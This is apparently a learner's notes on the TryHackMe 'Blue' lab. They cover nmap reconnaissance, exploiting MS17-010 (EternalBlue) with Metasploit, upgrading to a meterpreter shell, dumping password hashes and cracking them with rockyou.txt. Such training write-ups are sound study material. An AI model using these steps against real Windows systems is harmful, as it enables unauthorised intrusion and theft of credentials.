# TryHackMe Room: Blue

# Date:
    `06/12/2025`

## Objective: 
Deploy and hack into a windows machine, leveraging common misconfiguration issues


## Recon:

### Nmap Scan
```bash
nmap -T4 -sC -sV [target address]
```
### What did I learn from this? 
- There are three ports that are open under port # 1000
- I understand that this is vulnerable to Eternal Blue, but I don't understand the reason behind why it is vulnerable. 

### Vulnerable to MS17-010

### Gaining access through metasploit
```bash
msfconsole
search eternal blue
use 0

set LHOST [your IP]
set RHOSTS [target]

set payload 
```

## Escalate those privs
### Shell -> meterpreter 
To escalate, I needed to upgrade the shell to a meterpreter shell. 
To do that I used:
```bash
    /multi/manage/shell_to_meterpreter 
    sessions -u -1
```

Got the meterpreter command line then used hashdump to dump password hashes

Discovered somehow someway that was an md4 hash then used hashmap to compare with rockyou.txt
